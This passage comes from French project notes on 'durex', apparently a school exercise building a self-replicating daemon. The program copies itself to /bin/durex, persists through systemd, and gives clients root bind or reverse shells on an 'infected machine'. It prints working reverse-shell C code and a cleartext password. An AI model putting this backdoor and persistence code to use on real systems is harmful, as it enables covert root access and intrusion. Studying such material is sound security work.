      <text:p text:style-name="P7">Passons pour l'instant le début de la boucle, et examinons directement à partir du <text:span text:style-name="T6">poll</text:span>. Le <text:span text:style-name="T6">poll</text:span>, en mode shell, ne va que surveiller le <text:span text:style-name="T6">listen_sd</text:span> du serveur qui accepte de nouvelles connexions. Son troisième paramètre de <text:span text:style-name="T7">timeout</text:span><text:span text:style-name="T9"> est 0, ce qui veut dire que l'appel à </text:span><text:span text:style-name="T10">poll </text:span><text:span text:style-name="T9">n'est </text:span><text:span text:style-name="T10">pas bloquant</text:span><text:span text:style-name="T9"> : si aucun fd n'est prêt en lecture, on renvoie 0 et on </text:span><text:span text:style-name="T7">continue</text:span><text:span text:style-name="T9"> la boucle while.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9">Si on repère un fd prêt en lecture, il s'agira forcément du </text:span><text:span text:style-name="T10">listen_sd</text:span><text:span text:style-name="T9"> du serveur, qui a reçu une </text:span><text:soft-page-break/><text:span text:style-name="T9">nouvelle demande de connexion par un client. On ajoute le client à la liste de clients, de manière assez similaire au mode daemon.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9">On opère ensuite un </text:span><text:span text:style-name="T10">fork</text:span><text:span text:style-name="T9">, car on va avoir besoin d'un nouveau processus qui fournira à ce client sa </text:span><text:span text:style-name="T10">shell root</text:span><text:span text:style-name="T9">. Suite à ce fork, on remplace STDIN, STDOUT et STDERR du processus enfant par le </text:span><text:span text:style-name="T10">socket ouvert pour le client</text:span><text:span text:style-name="T9">, puis on lance </text:span><text:span text:style-name="T10">/bin/sh</text:span><text:span text:style-name="T9">. De cette manière, lorsque le client enverra des données sur la socket ouverte pour lui, il les enverra désormais à la shell root ; de même, lorsque le processus enfant voudra écrire sur stdout (résultat des commandes) ou stderr (erreurs des commandes), il les enverra au client. Tout se passera comme si le client avait bien une shell root.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9">Le processus parent va </text:span><text:span text:style-name="T10">attribuer au client le pid du processus enfant qui s'occupe de sa shell</text:span><text:span text:style-name="T9"> (</text:span><text:span text:style-name="T25">new_client-&gt;pid = pid</text:span><text:span text:style-name="T9">). Et c'est là que le début de la boucle infinie prend sens.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9">En effet, au début du </text:span><text:span text:style-name="T10">while(1)</text:span><text:span text:style-name="T9">, on va parcourir tous les clients du serveur ; si ce client a une shell (donc un pid non-négatif, cela devrait toujours être le cas), on </text:span><text:span text:style-name="T10">vérifie l'état du processus enfant du client correspondant à sa shell</text:span><text:span text:style-name="T9"> avec un </text:span><text:span text:style-name="T10">waitpid</text:span><text:span text:style-name="T9">. </text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9">Comme l'indique le man7 de waitpid :</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9">"</text:span><text:span text:style-name="T7">If WNOHANG was specified and one or more child(ren) specified by pid exist, but have not yet changed state, then 0 is returned.</text:span><text:span text:style-name="T9">"</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Autrement dit, on vérifie l'état du processus enfant du client correspondant à sa shell. Si un nombre positif est retourné, cela signifie que le processus a <text:span text:style-name="T6">exit</text:span> et que le client a terminé sa session shell : on ferme alors la connexion. Sinon, on passe.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Dans tous les cas, <text:span text:style-name="T6">waitpid</text:span> n'est pas bloquant et la boucle va continuer. De même, puisque <text:span text:style-name="T6">poll</text:span> n'est pas bloquant, la boucle while(1) va en fait nous permettre de constamment vérifier l'état des processus enfants des clients qui correspondent à leurs shells, et fermer les connexions lorsque nécessaires.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Un petit <text:span text:style-name="T6">if</text:span> s'occupe de vérifier si le nombre de clients tombe à 0 (et si une première shell a été ouverte) : si c'est le cas, on sort de la boucle infinie, on reset le serveur, et on repasse en mode daemon.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"/>
      <text:list xml:id="list32724434" text:continue-list="list8957952234922644004" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P34"><text:span text:style-name="T22"><text:s/></text:span>NEW-STYLE IMPLEMENTATION</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Comme on a pu le remarquer en introduction et comme indiqué dans la documentation, la méthode qui consiste à <text:span text:style-name="T7">daemoniser</text:span><text:span text:style-name="T9"> le processus manuellement, puis de créer un script init.d liké aux dossiers rc*.d est l'ancienne méthode pour créer des daemons, qui n'est aujourd'hui plus conseillé d'adopter :</text:span></text:p>
      <text:p text:style-name="P3"><text:a xlink:type="simple" xlink:href="https://man7.org/linux/man-pages/man7/daemon.7.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T9">https://man7.org/linux/man-pages/man7/daemon.7.html</text:span></text:a><text:span text:style-name="T9"> </text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T9"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T9">"</text:span><text:span text:style-name="T7">Modern services for Linux should be implemented as new-style daemons. This makes it easier to supervise and control them at runtime and simplifies their implementation. For developing a new-style daemon, none of the initialization steps recommended for SysV daemons need to be implemented. New-style init systems such as systemd make all of them redundant</text:span><text:span text:style-name="T9">".</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Les daemons devraient donc aujourd'hui être implémentés par le biais de systèmes d'initialisation tels que <text:span text:style-name="T6">systemd</text:span>, qui a été adopté sur l'intégralité des systèmes Linux récents. Dans le cadre d'une telle implémentation, c'est <text:span text:style-name="T6">systemd</text:span> qui se charge de transformer le processus indiqué en daemon, de manière bien plus robuste et sécurisée qu'une implémentation SysV.</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/></text:p>
      <text:p text:style-name="P3">Pour créer un service systemd :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">&gt; Il nous faut d'abord un binaire qu'on souhaite faire tourner en tant que daemon. La première étape de <text:span text:style-name="T6">durex</text:span> est donc inchangée, on fait en sortes que notre programme s'auto-réplique vers <text:span text:style-name="T6">/bin/durex</text:span> : il s'agira du binaire à faire tourner comme daemon.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P8"><text:span text:style-name="T13">&gt; Il faudra ensuite créer un fichier de configuration (</text:span><text:span text:style-name="T6">service unit file</text:span><text:span text:style-name="T13">) dans le dossier contenant ces fichiers d'unités de service. Une </text:span><text:span text:style-name="T10">service unit</text:span><text:span text:style-name="T11"> "</text:span><text:span text:style-name="T7">starts and controls daemons and the processes they consist of</text:span>". Il nous faut donc en définir une pour créer notre daemon.</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8">Le dossier contenant ces <text:span text:style-name="T7">service units</text:span><text:span text:style-name="T9"> peut être récupéré de deux façons :</text:span></text:p>
      <text:list xml:id="list1119133543647772203" text:style-name="L27">
        <text:list-item>
          <text:p text:style-name="P70"><text:span text:style-name="T9">Par le biais de l'output de la commande :</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P8"><text:span text:style-name="T25">pkg-config --variable=systemdsystemunitdir systemd</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T9"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T9">(L'output pour nous est </text:span><text:span text:style-name="T25">/lib/systemd/system</text:span><text:span text:style-name="T9">).</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list6731542026634948507" text:style-name="L28">
        <text:list-item>
          <text:p text:style-name="P49">Dans le dossier par défaut <text:span text:style-name="T1">/etc/systemd/system</text:span>. Les deux dossiers sont généralement présents, et celui dans <text:span text:style-name="T6">/etc/</text:span> est plutôt dédié aux services installés par les utilisateurs, lorsque la première option correspond plutôt aux services des package managers etc...</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Dans notre programme, on tente d'exécuter et de récupérer l'output de la commande <text:span text:style-name="T6">pkg-config</text:span> citée ci-dessus. Si la commande réussit, on prend ce path de folder ; sinon, on se rabat sur <text:span text:style-name="T1">/etc/systemd/system</text:span>.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">&gt; Une fois qu'on a trouvé le dossier des <text:span text:style-name="T6">service</text:span> <text:span text:style-name="T6">units</text:span>, on va créer le fichier de configuration qui nous permettra :</text:p>
      <text:list xml:id="list5616712640195306110" text:style-name="L29">
        <text:list-item>
          <text:p text:style-name="P50">D'utiliser la commande <text:span text:style-name="T6">systemctl start | stop | status</text:span> pour démarrer, arrêter, récupérer le statut du binaire cible qui tournera <text:span text:style-name="T6">en tant que daemon</text:span>.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P50">D'utiliser la commande <text:span text:style-name="T6">systemctl enable</text:span> pour faire en sortes que le binaire cible se lance au boot de la machine en tant que daemon.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"><text:span text:style-name="T6"/></text:p>
      <text:p text:style-name="P3">Ce fichier de <text:span text:style-name="T6">service unit</text:span> permet de faire tout ça :</text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images1" text:anchor-type="paragraph" svg:x="3.115cm" svg:y="0.392cm" svg:width="10.345cm" svg:height="5.241cm" draw:z-index="0"><draw:image xlink:href="Pictures/200000070000286A000014784C60A038.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="T6"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T14">[Unit]</text:span> : informations générales (description, <text:span text:style-name="T6">Wants</text:span> vide mais nécessaire pour le démarrage au boot).</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><text:span text:style-name="T14">[Service]</text:span> : ExecStart indique le binaire à exécuter en mode daemon. Pour savoir pourquoi on l'exécute via <text:span text:style-name="T6">stdbuf -oL</text:span> et pas directement avec <text:span text:style-name="T6">/bin/durex</text:span>, voir les remarques à la fin.</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T14">[Install]</text:span> : WantedBy décrit le <text:span text:style-name="T6">runlevel</text:span> auquel le service se lancera en tant que daemon au boot. Sans cette ligne, il est impossible de lancer <text:span text:style-name="T6">systemctl enable</text:span> :</text:p>
      <text:p text:style-name="P3"><text:a xlink:type="simple" xlink:href="https://unix.stackexchange.com/questions/404667/systemd-service-what-is-multi-user-target/404671" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://unix.stackexchange.com/questions/404667/systemd-service-what-is-multi-user-target/404671</text:a></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Multi-user.target est équivalent au <text:span text:style-name="T6">runlevel 3</text:span> en termes SysV.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">&gt; Une fois toutes ces étapes effectuées, on fait exécuter à <text:span text:style-name="T6">durex</text:span> les commandes suivantes :</text:p>
      <text:list xml:id="list5880250421863684575" text:style-name="L30">
        <text:list-item>
          <text:p text:style-name="P73">systemctl enable durex.service</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P73">systemctl start durex.service</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Pour éviter qu'en démarrant le programme en mode daemon, les étapes de setup (écriture des fichiers de configuration etc...) ne soient répétées, on indique au programme que si le <text:span text:style-name="T6">PPID</text:span> (parent PID) du programme est <text:span text:style-name="T6">1</text:span> (ce qui est le cas lorsqu'il est lancé avec systemctl, au bot ou non), alors seul le payload du daemon s'exécute.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">&gt; Tout le reste du programme (loop daemon, mode shell...) est strictement identique à l'implémentation Old-Style, puisque seule la manière de créer le daemon a été modifiée.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Doc ubuntu :</text:p>
      <text:p text:style-name="P3"><text:a xlink:type="simple" xlink:href="https://doc.ubuntu-fr.org/creer_un_service_avec_systemd" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://doc.ubuntu-fr.org/creer_un_service_avec_systemd</text:a> </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list32705272" text:continue-list="list32724434" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P34"><text:span text:style-name="T22"><text:s/></text:span>REVERSE SHELL IMPLEMENTATION</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Reverse shell basique : <text:a xlink:type="simple" xlink:href="https://gist.github.com/0xabe-io/916cf3af33d1c0592a90" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://gist.github.com/0xabe-io/916cf3af33d1c0592a90</text:a> </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">La dernière variation propose une implémentation du daemon en New-Style, de manière strictement identique à la précédente. Cependant, <text:span text:style-name="T6">au lieu de proposer une Bind Shell, elle ouvre des reverse shells</text:span> sur la machine attaquante.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">En d'autres termes, les programmes précédents passaient en mode shell lorsqu'un client entrait "shell", de telle sorte que lorsqu'un utilisateur se connectait sur le port 4242 de la machine infectée, il accédait à une shell root.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Dans l'implémentation reverse shell, lorsque le client entre "shell", le daemon ne se modifie en rien (il ne passe pas en "mode shell") : il va simplement tenter de se connecter à un port <text:span text:style-name="T6">de la machine du client</text:span> et, s'il réussit, lier au socket ainsi ouvert (par <text:span text:style-name="T6">connect</text:span> donc, pas par <text:span text:style-name="T6">accept</text:span>) à un processus qui fait tourner une shell root.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">La première chose, pour pouvoir faire cela, est de récupérer <text:span text:style-name="T6">l'adresse IP </text:span>de chaque client (car s'il requiert une shell, on va vouloir utiliser <text:span text:style-name="T6">connect</text:span> pour se connecter à l'un de ses ports, et pour ça on a bien sûr besoin de son adresse IP). On ajoute donc à nos structure<text:span text:style-name="T6"> t_client</text:span> une variable <text:span text:style-name="T1">struct sockaddr_in</text:span>. Lorsque notre daemon d'origine <text:span text:style-name="T6">accepte</text:span> une connexion, on va remplir cette structure avec les informations de connexion, dont l'adresse IP :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P4">new_sd = accept(server-&gt;listen_sd, (struct sockaddr *)&amp;sockaddr, &amp;len)</text:p>
      <text:p text:style-name="P4">[... SNIP ..]</text:p>
      <text:p text:style-name="P4"><text:soft-page-break/>new_client-&gt;sockaddr = sockaddr</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On a désormais les informations nécessaires. Lorsqu'un client va entrer "shell", voici la fonction qui sera exécutée :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P15">[.... SNIP ....]</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"><text:s text:c="4"/><text:span text:style-name="T15">pid_t</text:span> <text:s text:c="18"/><text:span text:style-name="T17">pid;</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T17">pid</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T17">fork();</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T17">(pid</text:span> <text:span text:style-name="T17">==</text:span> <text:span text:style-name="T17">-</text:span><text:span text:style-name="T20">1</text:span><text:span text:style-name="T17">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">fatal(server);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T19">else</text:span> <text:span text:style-name="T16">if</text:span> <text:span text:style-name="T17">(pid</text:span> <text:span text:style-name="T17">==</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T19">struct</text:span> <text:span text:style-name="T17">sockaddr_in</text:span> <text:s text:c="5"/><text:span text:style-name="T17">sa;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T15">int</text:span> <text:s text:c="20"/><text:span text:style-name="T17">s;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T15">char</text:span> <text:s text:c="19"/><text:span text:style-name="T17">*</text:span><text:span text:style-name="T19">const</text:span> <text:span text:style-name="T17">args[]</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T17">{</text:span><text:span text:style-name="T21">"/bin/sh"</text:span><text:span text:style-name="T17">,</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">};</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">sa.sin_family</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T17">AF_INET;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">sa.sin_addr.s_addr</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T17">(client-&gt;sockaddr).sin_addr.s_addr;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">sa.sin_port</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T17">htons(port);</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">s</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T17">socket(AF_INET,</text:span> <text:span text:style-name="T17">SOCK_STREAM,</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T17">((connect(s,</text:span> <text:span text:style-name="T17">(</text:span><text:span text:style-name="T19">struct</text:span> <text:span text:style-name="T17">sockaddr</text:span> <text:span text:style-name="T17">*)&amp;sa,</text:span> <text:span text:style-name="T19">sizeof</text:span><text:span text:style-name="T17">(sa)))</text:span> <text:span text:style-name="T17">==</text:span> <text:span text:style-name="T17">-</text:span><text:span text:style-name="T20">1</text:span><text:span text:style-name="T17">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T17">send_info(server,</text:span> <text:span text:style-name="T17">client-&gt;fd,</text:span> <text:span text:style-name="T21">"[!] Couldn't open reverse shell.\n$&gt; "</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T17">printf(</text:span><text:span text:style-name="T21">"[LOG] Couldn't open shell for client %d.\n"</text:span><text:span text:style-name="T17">,</text:span> <text:span text:style-name="T17">client-&gt;id);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T17">exit(</text:span><text:span text:style-name="T20">1</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">send_info(server,</text:span> <text:span text:style-name="T17">client-&gt;fd,</text:span> <text:span text:style-name="T21">"[+] Reverse shell connection successfull.\n$&gt; "</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">printf(</text:span><text:span text:style-name="T21">"[LOG] Successfully opened shell for client %d.\n"</text:span><text:span text:style-name="T17">,</text:span> <text:span text:style-name="T17">client-&gt;id);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">dup2(s,</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">dup2(s,</text:span> <text:span text:style-name="T20">1</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">dup2(s,</text:span> <text:span text:style-name="T20">2</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">execve(</text:span><text:span text:style-name="T21">"/bin/sh"</text:span><text:span text:style-name="T17">,</text:span> <text:span text:style-name="T17">args,</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T19">else</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T19">return</text:span> <text:span text:style-name="T17">;</text:span></text:p>
      <text:p text:style-name="P3">On voit ici qu'on essaie activement de se connecter à l'adresse IP du client (sur un port qu'il choisit, ou 4444 par défaut). Si on réussit, on remplace comme d'habitude STDIN, STDOUT et STDERR par le socket du client puis on <text:span text:style-name="T6">execve</text:span> <text:span text:style-name="T6">/bin/sh</text:span>.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">La différence ici est donc bien que le serveur n'attend pas que les clients s'y connectent lorsqu'il est en mode shell pour leur donner accès à une shell, il propose d'ouvrir une reverse shell sur le port spécifié (le client doit y avoir placé un <text:span text:style-name="T6">listener </text:span>bien sûr pour recevoir la shell).</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">L'avantage est que le daemon peut continuer à tourner à côté, sans devoir se placer en mode shell.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><text:soft-page-break/></text:p>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list6679334650546742064" text:style-name="L31">
        <text:list-item>
          <text:p text:style-name="P35">REMARQUES / DIVERS</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P7">&gt; Dans les implémentations New-Style, pourquoi lancer le binaire avec la commande suivante :</text:p>
      <text:p text:style-name="P7">/usr/bin/stdbuf -oL /bin/durex</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Car sinon les logs (les <text:span text:style-name="T10">printf</text:span><text:span text:style-name="T9"> du programme, que </text:span><text:span text:style-name="T10">systemd</text:span><text:span text:style-name="T9"> rattache à son système de logs) ne sont pas correctement affichés, car STDOUT met en tampon (4096 bytes?) les messages reçus au lieu de les afficher au fur et à mesure.</text:span></text:p>
      <text:p text:style-name="P7"><text:a xlink:type="simple" xlink:href="https://askubuntu.com/questions/620219/systemd-on-15-04-wont-log-stdout-of-unit" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T9">https://askubuntu.com/questions/620219/systemd-on-15-04-wont-log-stdout-of-unit</text:span></text:a></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9">&gt; Le sujet demandait un minimum de sécurité dans l'authentification / pas de mot de passe en clair dans le code source. J'ai du coup utilisé la fonction </text:span><text:span text:style-name="T10">crypt()</text:span><text:span text:style-name="T9"> en C :</text:span></text:p>
      <text:p text:style-name="P7"><text:a xlink:type="simple" xlink:href="https://man7.org/linux/man-pages/man3/crypt.3.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T9">https://man7.org/linux/man-pages/man3/crypt.3.html</text:span></text:a><text:span text:style-name="T9"> </text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9">J'ai commencé par </text:span><text:span text:style-name="T10">hasher</text:span><text:span text:style-name="T9"> dans un petit programme indépendant un mot de passe aléatoire robuste (voir fichier .password) :</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"/></text:p>
      <text:p text:style-name="P27"><text:span text:style-name="T9">#include &lt;stdio.h&gt;</text:span></text:p>
      <text:p text:style-name="P28">#include &lt;unistd.h&gt;</text:p>
      <text:p text:style-name="P28">#include &lt;crypt.h&gt;</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T15">int</text:span> <text:s text:c="3"/><text:span text:style-name="T16">main</text:span><text:span text:style-name="T17">(</text:span><text:span text:style-name="T15">void</text:span><text:span text:style-name="T17">)</text:span></text:p>
      <text:p text:style-name="P16">{</text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T15">char</text:span> <text:span text:style-name="T17">clear_pass[]</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T21">"#ckhpe_6ppSb~a]2Z!GtdKeks?p?#$Fg"</text:span><text:span text:style-name="T17">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T17">printf(</text:span><text:span text:style-name="T21">"%s"</text:span><text:span text:style-name="T17">,</text:span> <text:span text:style-name="T17">crypt(clear_pass,</text:span> <text:span text:style-name="T21">"42"</text:span><text:span text:style-name="T17">));</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T19">return</text:span> <text:span text:style-name="T17">(</text:span><text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P3">On le compile en le linkant avec <text:span text:style-name="T6">-lcrypt</text:span> :</text:p>
      <text:p text:style-name="P4">gcc gen.c -lcrypt -o gen</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Et on l'exécute pour obtenir le hash du mot de passe :</text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images3" text:anchor-type="paragraph" svg:x="0.019cm" svg:y="0.222cm" svg:width="4.524cm" svg:height="0.954cm" draw:z-index="2"><draw:image xlink:href="Pictures/20000007000011AD000003BA390F7A6D.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3">On peut maintenant supprimer notre petit programme. On définit ce hash comme une constante dans notre programme <text:span text:style-name="T6">durex</text:span>, et on va venir comparer le mot de passe fourni par l'utilisateur <text:span text:style-name="T6">avec ce hash</text:span> dans la fonction d'authentification (server-&gt;buff contient l'input utilisateur) :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr3" draw:name="images4" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="4.039cm" draw:z-index="3"><draw:image xlink:href="Pictures/2000000700005C32000015EABD12915D.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3"><text:a xlink:type="simple" xlink:href="https://stackoverflow.com/questions/10273414/library-for-passwords-salt-hash-in-c" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://stackoverflow.com/questions/10273414/library-for-passwords-salt-hash-in-c</text:a></text:p>
      <text:p text:style-name="P3"><text:soft-page-break/></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">&gt; Petit point sur les commandes <text:span text:style-name="T6">systemctl</text:span>, <text:span text:style-name="T6">service</text:span>. Comme on a pu le voir dans ce document, SysV représentait l'ancienne méthode pour créer des daemons, et systemd la plus récente.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">La commande <text:span text:style-name="T6">systemctl</text:span> permet la gestion des services <text:span text:style-name="T6">systemd</text:span> :</text:p>
      <text:p text:style-name="P4">systemctl start | stop | status</text:p>
      <text:p text:style-name="P4">systemctl enable | disable</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1">systemctl daemon-reload</text:span><text:tab/><text:tab/>(charger les changements dans les service units)</text:p>
      <text:p text:style-name="P3">etc...</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">La commande <text:span text:style-name="T6">service</text:span> permettait à l'origine de gérer les daemons SysV :</text:p>
      <text:p text:style-name="P4">service start | stop | status</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Cependant, sur les systèmes modernes, la commande <text:span text:style-name="T6">service</text:span> redirige en réalité sur la commande <text:span text:style-name="T6">systemctl</text:span>, dans le sens où <text:span text:style-name="T6">systemd</text:span> s'occupe également de la gestion des daemons implémentés en old-style :</text:p>
